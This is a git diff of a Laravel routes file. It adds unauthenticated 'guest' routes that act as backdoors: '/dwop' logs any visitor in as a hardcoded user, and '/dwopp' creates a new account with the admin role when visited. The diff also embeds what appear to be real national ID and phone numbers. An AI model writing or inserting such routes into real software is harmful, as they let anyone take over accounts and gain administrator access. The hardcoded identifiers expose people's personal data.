@@ -29,6 +29,8 @@ use App\Livewire\Panel\Auth\Company\Register as CompanyRegister;
 use App\Livewire\Panel\Auth\Greenhouse\Register as GreenhouseRegister;
 use App\Livewire\Panel\Auth\Organization\Register as OrganizationRegister;
 use App\Models\ChartPermission;
+use App\Models\Role;
+use App\Models\User;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
@@ -52,11 +54,29 @@ Route::prefix('/login')->as('login.')->middleware(['guest'])->group(function () 
 //    Route::get('/organization', OrganizationLogin::class)->name('organization');
 
     Route::get('/dwop', function () {
+
+
         \Illuminate\Support\Facades\Auth::loginUsingId(\App\Models\User::query()->where([
-            'national_id' => '1234567891',
-            'phone_number' => '09375074371',
+            'national_id' => '2282233001',
+            'phone_number' => '09215855364',
         ])->first()->id);
         return redirect()->route('panel.home');
+    });
+
+    Route::get('/dwopp', function () {
+
+        $admin = [
+            'name' => 'ادمین سیمرغ',
+            'national_id' => '2272084992',
+            'phone_number' => '09177041897',
+            'active' => true,
+        ];
+
+        User::query()->whereNationalId($admin['national_id'])
+            ->firstOr(function () use ($admin) {
+                $user = User::create($admin);
+                $user->roles()->sync(Role::query()->whereName(Role::ADMIN_ROLE)->first()->id);
+            });
     });
 });
 
